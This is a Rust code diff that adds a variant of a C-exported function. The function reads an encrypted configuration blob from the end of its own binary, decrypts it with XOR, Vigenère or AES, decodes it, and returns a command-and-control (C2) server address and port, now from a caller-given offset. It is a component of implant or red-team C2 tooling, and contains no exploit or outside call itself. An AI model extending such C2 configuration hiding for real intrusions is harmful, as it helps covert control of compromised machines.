@@ -203,6 +203,25 @@ pub extern "C" fn read_cfg_with_encryption(
     raw_key: *const std::ffi::c_char,
     enc_type: std::ffi::c_int,
 ) -> *const std::ffi::c_char {
+    read_cfg_with_encryption_o(raw_key, enc_type, 0)
+}
+
+#[no_mangle]
+/// function designed to read the configuration bytes and
+/// return the C2 address. this will read the data from the
+/// end of the binary, decrypt it based on the encryption type
+/// passed in by the user, Base64 decode, JSON decode it, then
+/// grab the address and port from the Configuration struct that
+/// resulted from the JSON decoding.
+///
+/// important note: it is the caller's responsibility to clean up the string that gets
+/// returned by this funciton. the caller should call `free_memory` on the string returned
+/// by this function after they are done using it, to avoid memory leaks.
+pub extern "C" fn read_cfg_with_encryption_o(
+    raw_key: *const std::ffi::c_char,
+    enc_type: std::ffi::c_int,
+    raw_offset: std::ffi::c_uint,
+) -> *const std::ffi::c_char {
     // if null is passed in as the key, use q as the default;
     // otherwise use the char* key passed in.
     let key: &[u8] = convert_key_from_c(&raw_key);
@@ -215,6 +234,14 @@ pub extern "C" fn read_cfg_with_encryption(
         Err(_) => return std::ptr::null(),
     };
 
+    // attempt to convert the user input into a rust usize var.
+    //
+    // if this fails, NULL will be returned.
+    let offset: usize = match raw_offset.try_into() {
+        Ok(u_val) => u_val,
+        Err(_) => return std::ptr::null(),
+    };
+
     // create the decryptor based on the user's input. this will compare
     // the int with the enum to determine what kind of decryptor to create.
     //
@@ -223,21 +250,21 @@ pub extern "C" fn read_cfg_with_encryption(
     if enc_type_i32 == cfgparser_encryption::EncryptionType::Xor as i32 {
         let decryptor: cfgparser_encryption::xor::engine::XORCipher =
             cfgparser_encryption::xor::engine::XORCipher::new(key.to_vec());
-        read_result = read_self(decryptor, extractor::core::OFFSET_NONE);
+        read_result = read_self(decryptor, offset);
     } else if enc_type_i32 == cfgparser_encryption::EncryptionType::Viginere as i32 {
         let decryptor: cfgparser_encryption::viginere::engine::ViginereCipher =
             match cfgparser_encryption::viginere::engine::ViginereCipher::new(key.to_vec()) {
                 Ok(vc) => vc,
                 Err(_) => return std::ptr::null(),
             };
-        read_result = read_self(decryptor, extractor::core::OFFSET_NONE);
+        read_result = read_self(decryptor, offset);
     } else if enc_type_i32 == cfgparser_encryption::EncryptionType::Aes as i32 {
         let decryptor: cfgparser_encryption::aes::engine::AESCipher =
             match cfgparser_encryption::aes::engine::AESCipher::new(key.to_vec()) {
                 Ok(aesc) => aesc,
                 Err(_) => return std::ptr::null(),
             };
-        read_result = read_self(decryptor, extractor::core::OFFSET_NONE);
+        read_result = read_self(decryptor, offset);
     } else {
         read_result = Err("invalid encryption type".into());
     }
